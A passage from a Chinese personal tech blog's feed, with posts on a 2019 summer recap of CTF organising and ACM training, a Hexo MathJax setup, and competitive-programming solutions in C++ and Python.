class="line">f();</span><br></pre></td></tr></table></figure><p>可以看到，rosyln创建了一个单独的类，在运行时将自由变量赋给这个类的成员，从而实现了闭包。</p><p>btw，我们还能从上面的反编译出来的代码中推断出，对于闭包，C#采用了引用传递，而非值传递（由于变量的地址相同，反编译器把它们当作了同一个变量）。仔细思考一下，这符合描述闭包的哪一句定义？</p><h2 id="Backing-Field-与-getter-setter">Backing Field 与 getter/setter</h2><p>// WIP</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于MacOS Catalina上32bit程序惨遭抛弃，最近一段时间实在没动力为了玩osu!而重启电脑切Windows，于是最近几周在逆旧版的osu!，试图搞清楚关于player point统计、聊天室协议等一系列实现。由于逆的过程中碰到了一些关于微软roslyn的具体实</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2019暑假划水小结</title>
    <link href="https://blog.frankli.site/2019/08/23/Misc/2019%E6%9A%91%E5%81%87%E5%88%92%E6%B0%B4%E5%B0%8F%E7%BB%93/"/>
    <id>https://blog.frankli.site/2019/08/23/Misc/2019%E6%9A%91%E5%81%87%E5%88%92%E6%B0%B4%E5%B0%8F%E7%BB%93/</id>
    <published>2019-08-23T09:50:44.000Z</published>
    <updated>2021-06-15T06:40:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TOC">[TOC]</h2><ul><li>moeCTF</li><li>mssCTF</li><li>ACM牛客多校</li><li>ACM暑训</li></ul><h2 id="moeCTF">moeCTF</h2><p>今年的moeCTF貌似开早了，题也放的超级多<br>有EndCat带设计师的加持，今年的moeCTF的海报和logo做的究级有排面<br>服务器的uptime &gt;= 95%，还行</p><p>平台的一些修改:</p><ul><li>添加了提交flag时的hook，每次正确提交都会在群里提示</li><li>添加了hidden用户的排行榜，方便大师傅们看榜</li></ul><h2 id="mssCTF">mssCTF</h2><p>去年参加的mssCTF今年还是西电举办，于是我就做了些微小的工作…<br>虽然说最后成功让CTFd支持了ACM评测，但是由于过程极其坎坷，浪费了很多时间，我觉得比较失败<br><a href="/2019/07/25/%E7%BB%99CTFd%E5%8A%A0%E4%B8%8AACM%E8%AF%84%E6%B5%8B%E5%8A%9F%E8%83%BD/">一些微小的工作</a></p><h2 id="ACM牛客多校">ACM牛客多校</h2><p>暑假主要参与的活动就是牛客的多校训练。我有以下几点感受：</p><ul><li>我好菜啊</li><li>我好蔡啊</li><li>我好🥬啊</li></ul><p>看到几何旋律每次都直接平A过去，心态有·崩<br>交钱买了一件衣服<br><a href="/2019/08/06/2019%E6%9A%91%E6%9C%9F%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1/">多校</a></p><h2 id="ACM暑期集训">ACM暑期集训</h2><p>每天早上9点开始的集训，本来是暑实的大好机会，然而由于多种因素共同导致的事件而错过了。<br>说实在的挺后悔的，没特别认真的听，又在浪费时间浪费生命。<br>ACM暑训模拟赛 校内Au, 3rd</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;TOC&quot;&gt;[TOC]&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;moeCTF&lt;/li&gt;
&lt;li&gt;mssCTF&lt;/li&gt;
&lt;li&gt;ACM牛客多校&lt;/li&gt;
&lt;li&gt;ACM暑训&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;moeCTF&quot;&gt;moeCTF&lt;/h2&gt;
&lt;p&gt;今年的moeCTF貌</summary>
      
    
    
    
    
    <category term="小结" scheme="https://blog.frankli.site/tags/%E5%B0%8F%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>给blog添加MathJax支持时踩的坑</title>
    <link href="https://blog.frankli.site/2019/08/07/Dev/%E8%AE%BAmathjax%E8%B8%A9%E5%9D%91/"/>
    <id>https://blog.frankli.site/2019/08/07/Dev/%E8%AE%BAmathjax%E8%B8%A9%E5%9D%91/</id>
    <published>2019-08-06T16:00:00.000Z</published>
    <updated>2025-10-19T20:35:08.563Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>我就不应该想起来要折腾博客的</p></blockquote><h2 id="结论">结论</h2><p>结论放前面吧<br>hexo自带的renderer对mathjax较不友好，于是换成了<code>hexo-renderer-markdown-it</code><br><a href="https://github.com/hexojs/hexo-renderer-marked">renderer-marked</a><br><a href="https://github.com/hexojs/hexo-renderer-markdown-it">renderer-markdown-it</a><br>其实这并没有解决我的问题，只是看着有commonmark…真正解决我问题的是<a href="https://github.com/hexojs/hexo-renderer-markdown-it/issues/36">这个issue</a></p><p>现在的配置基本上是这样:<br>npm install --save hexo-renderer-markdown-it markdown-it-mathjax<br>使用了cactus主题，具体配置不说，主要是在cactus/layout/poast.ejs中要手动对文章内的公式渲染一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span>(page.<span class="property">math</span>) &#123; %&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/x-mathjax-config&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title class_">MathJax</span>.<span class="property">Hub</span>.<span class="title class_">Config</span>(&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="string">&quot;HTML-CSS&quot;</span>: &#123; </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">scale</span>: <span class="number">100</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">preferredFont</span>: <span class="string">&quot;TeX&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">availableFonts</span>: [<span class="string">&quot;STIX&quot;</span>,<span class="string">&quot;TeX&quot;</span>],</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">linebreaks</span>: &#123; <span class="attr">automatic</span>:<span class="literal">true</span> &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="title class_">EqnChunk</span>: (<span class="title class_">MathJax</span>.<span class="property">Hub</span>.<span class="property">Browser</span>.<span class="property">isMobile</span> ? <span class="number">10</span> : <span class="number">50</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">tex2jax</span>: &#123; </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">inlineMath</span>: [ [<span class="string">&quot;$&quot;</span>, <span class="string">&quot;$&quot;</span>] ],</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">displayMath</span>: [ [<span class="string">&quot;$$&quot;</span>, <span class="string">&quot;$$&quot;</span>] ],</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">processEscapes</span>: <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">ignoreClass</span>: <span class="string">&quot;tex2jax_ignore|dno&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">skipTags</span>: [<span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;noscript&#x27;</span>, <span class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;textarea&#x27;</span>, <span class="string">&#x27;pre&#x27;</span>, <span class="string">&#x27;code&#x27;</span>]</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title class_">TeX</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">noUndefined</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="attr">attributes</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="attr">mathcolor</span>: <span class="string">&quot;red&quot;</span>, <span class="attr">mathbackground</span>: <span class="string">&quot;#FFEEEE&quot;</span>, <span class="attr">mathsize</span>: <span class="string">&quot;90%&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;, <span class="title class_">Macros</span>: &#123; <span class="attr">href</span>: <span class="string">&quot;&#123;&#125;&quot;</span> &#125; </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">messageStyle</span>: <span class="string">&quot;none&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;); </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/x-mathjax-config&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title class_">MathJax</span>.<span class="property">Hub</span>.<span class="title class_">Queue</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> all = <span class="title class_">MathJax</span>.<span class="property">Hub</span>.<span class="title function_">getAllJax</span>(), i;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; all.<span class="property">length</span>; i += <span class="number">1</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            all[i].<span class="title class_">SourceElement</span>().<span class="property">parentNode</span>.<span class="property">className</span> += <span class="string">&#x27; has-jax&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>然后在需要用mathjax的文章的header里头填个</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">math:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>就好啦</p><h2 id="使用Mathjax备忘">使用Mathjax备忘</h2><p>除了mathjax的基本语法，有些会用到但不太常用到的东西在这稍稍记一下，长期更新</p><p>本篇文章设置了<code>math: false</code></p><h3 id="功能">功能</h3><p>写法</p><h3 id="多行公式-对齐">多行公式+对齐</h3><p>\begin{align}<br>&amp; 1+1 \\<br>= &amp; 2 \\<br>= &amp; 5-4<br>\end{align}</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;我就不应该想起来要折腾博客的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;结论&quot;&gt;结论&lt;/h2&gt;
&lt;p&gt;结论放前面吧&lt;br&gt;
hexo自带的renderer对mathjax较不友好，于是换成了&lt;code&gt;hexo-renderer-mark</summary>
      
    
    
    
    
    <category term="DevOps" scheme="https://blog.frankli.site/tags/DevOps/"/>
    
    <category term="Misc" scheme="https://blog.frankli.site/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>2019暑期牛客多校</title>
    <link href="https://blog.frankli.site/2019/08/06/Misc/2019%E6%9A%91%E6%9C%9F%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1/"/>
    <id>https://blog.frankli.site/2019/08/06/Misc/2019%E6%9A%91%E6%9C%9F%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1/</id>
    <published>2019-08-05T16:00:00.000Z</published>
    <updated>2021-04-11T21:40:12.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>WIP</p></blockquote><h2 id="第三场">第三场</h2><h3 id="B-Crazy-Binary-String">B: Crazy Binary String</h3><p>签到题<br>初步想法是$v_i$记录在$i$处出现过的0与1个数之差，当$v_j == v_i (j \gt i)$时计算$j-i$，记录其最大值<br>然而这就是个前缀和。。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(a[i])state++;</span><br><span class="line">    <span class="keyword">else</span> state--;</span><br><span class="line">    <span class="keyword">if</span>(first[state])</span><br><span class="line">        maxx = <span class="built_in">max</span>(maxx, i-first[state]);</span><br><span class="line">    <span class="keyword">else</span> first[state] = i;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;maxx;</span><br></pre></td></tr></table></figure><h3 id="J-LRU-management">J: LRU management</h3><p>大暴力，模拟<br>赛后补题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">list&lt;pair&lt;string, <span class="type">int</span>&gt;&gt; cache;</span><br><span class="line">unordered_map&lt;string, list&lt;pair&lt;string, <span class="type">int</span>&gt;&gt;::iterator&gt; last;</span><br><span class="line"><span class="type">int</span> T, Q, M;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">access</span><span class="params">(<span class="type">const</span> string &amp;str, <span class="type">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> ite = last.<span class="built_in">find</span>(str);</span><br><span class="line">    <span class="keyword">if</span> (ite != last.<span class="built_in">end</span>()) &#123;</span><br><span class="line">        <span class="keyword">auto</span> cur = ite-&gt;second;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, cur-&gt;second);</span><br><span class="line">        cache.<span class="built_in">push_back</span>(*cur);</span><br><span class="line">        cache.<span class="built_in">erase</span>(cur);</span><br><span class="line">        last[cur-&gt;first] = <span class="built_in">prev</span>(cache.<span class="built_in">end</span>());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, v);</span><br><span class="line">        cache.<span class="built_in">emplace_back</span>(str, v);</span><br><span class="line">        last[str] = <span class="built_in">prev</span>(cache.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">int</span>(cache.<span class="built_in">size</span>()) &gt; M) &#123;</span><br><span class="line">            last.<span class="built_in">erase</span>(cache.<span class="built_in">front</span>().first);</span><br><span class="line">            cache.<span class="built_in">erase</span>(cache.<span class="built_in">begin</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    last[str] = <span class="built_in">prev</span>(cache.<span class="built_in">end</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">(<span class="type">const</span> string &amp;str, <span class="type">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> ite = last.<span class="built_in">find</span>(str);</span><br><span class="line">    <span class="keyword">if</span> ((ite == last.<span class="built_in">end</span>()) ||</span><br><span class="line">        (v == <span class="number">1</span> &amp;&amp; <span class="built_in">next</span>(ite-&gt;second) == cache.<span class="built_in">end</span>()) ||</span><br><span class="line">        (v == <span class="number">-1</span> &amp;&amp; ite-&gt;second == cache.<span class="built_in">begin</span>()))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> result = ite-&gt;second;</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">-1</span>)</span><br><span class="line">            result--;</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">1</span>)</span><br><span class="line">            result++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, result-&gt;second);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">2048</span>];</span><br><span class="line"><span class="type">int</span> opt, v;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--) &#123;</span><br><span class="line">        cache.<span class="built_in">clear</span>();</span><br><span class="line">        last.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;Q, &amp;M);</span><br><span class="line">        <span class="keyword">while</span> (Q--) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %s %d&quot;</span>, &amp;opt, buffer, &amp;v);</span><br><span class="line">            <span class="keyword">if</span> (opt)</span><br><span class="line">                <span class="built_in">query</span>(buffer, v);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">access</span>(buffer, v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Magic-Line">Magic Line</h3><blockquote><p>做几何的时候一定要注意代码的细节</p></blockquote><p>过分别按照x与y取中位数得到的点画一条线，将坐标延伸至无限远，进行微小的调整，即可错开这个点。<br>此处有一细节问题：当调整极远处坐标时应考虑到线的旋转，从而会影响到一开始排序的方向。</p><h2 id="第五场">第五场</h2><h3 id="generator1">generator1</h3><h4 id="题意">题意</h4><p>计算$2*2$矩阵的$n$次幂($n \leq 10^{10^6}$)</p><h4 id="思路">思路</h4><p>首先$n$这么大，快速幂是肯定的。但是有个问题就是<br>这个整数转换为&quot;整数&quot;的复杂度不可忽略。<br>将n视为字符串$n_1,n_2,n_3,…,n_{|n|}$，其中$n_i$代表n的第i数位，对矩阵T有</p><p>\begin{align}<br>&amp; T^{int(n)} \\<br>==&amp; T^{n_1*10^{|n|}+n_2*10^{|n|-1}+…} \\<br>==&amp; T^{n_1*10^{|n|}}*T^{n_2*10^{|n|-1}}*…*T^{n_{|n|} *10^0}<br>\end{align}</p><h4 id="备注">备注</h4><p>考场上应当就问题考虑解决问题的办法，找到问题的特征，不应该抱着现成的板子不放。过不去肯定有别的问题。<br><s>但是我现在只想去世</s></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; /**/&gt; mat;</span><br><span class="line">mat unit = mat&#123;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&#123;<span class="number">1</span>, <span class="number">0</span>&#125;, vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;&#125;;</span><br><span class="line">mat zero = mat&#123;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&#123;<span class="number">0</span>, <span class="number">0</span>&#125;, vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&#123;<span class="number">0</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line"><span class="type">int</span> a, b, x1, x2, mod;</span><br><span class="line"><span class="type">char</span> n[<span class="number">1000000</span>];</span><br><span class="line"><span class="type">const</span> mat <span class="keyword">operator</span>*(<span class="type">const</span> mat &amp;a, <span class="type">const</span> mat &amp;b) &#123;</span><br><span class="line">    mat ret = zero;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">2</span>; k++)</span><br><span class="line">                ret[i][j] += a[i][k] * b[k][j];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)</span><br><span class="line">            ret[i][j] %= mod;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="type">const</span> T <span class="keyword">operator</span>^(T a, <span class="type">int</span> n) &#123;</span><br><span class="line">    T ret = unit;</span><br><span class="line">    <span class="keyword">while</span> (n) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n &amp; <span class="number">1</span>)</span><br><span class="line">            ret = ret * a;</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        a = a * a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;x1, &amp;x2, &amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s %d&quot;</span>, n, &amp;mod);</span><br><span class="line">    <span class="type">int</span> length = <span class="built_in">strlen</span>(n);</span><br><span class="line">    mat res = unit;</span><br><span class="line">    mat base = mat&#123;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&#123;a, b&#125;, vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&#123;<span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n[i] - <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            res = res * (base ^ (n[i] - <span class="string">&#x27;0&#x27;</span>));</span><br><span class="line">        base = base ^ <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res = res * mat&#123;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&#123;x2, <span class="number">0</span>&#125;, vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&#123;x1, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, res[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="three-points-1">three points 1</h3><blockquote><p>有思路有思路。。。。<br>十分钟能写完么<br>不能</p></blockquote><h2 id="第六场">第六场</h2><h3 id="B-Shorten-IPv6-Address">B: Shorten IPv6 Address</h3><p>比赛的时候我在干什么系列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">T = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">case</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> T &gt; <span class="keyword">case</span>:</span><br><span class="line">    <span class="keyword">case</span> += <span class="number">1</span></span><br><span class="line">    x = <span class="built_in">input</span>()</span><br><span class="line">    x = [</span><br><span class="line">        <span class="built_in">int</span>(x[i:i+<span class="number">16</span>], <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(</span><br><span class="line">            <span class="number">0</span>, <span class="built_in">len</span>(x), <span class="number">16</span></span><br><span class="line">        )]</span><br><span class="line">    s = [<span class="string">&#x27;:&#x27;</span>.join([<span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> x])]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> x[i:j+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">if</span> k != <span class="number">0</span>:</span><br><span class="line">                    flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                s.append(<span class="string">&#x27;:&#x27;</span>.join([<span class="built_in">hex</span>(_)[<span class="number">2</span>:] <span class="keyword">for</span> _ <span class="keyword">in</span> x[:i]])+<span class="string">&#x27;::&#x27;</span>+</span><br><span class="line">                         <span 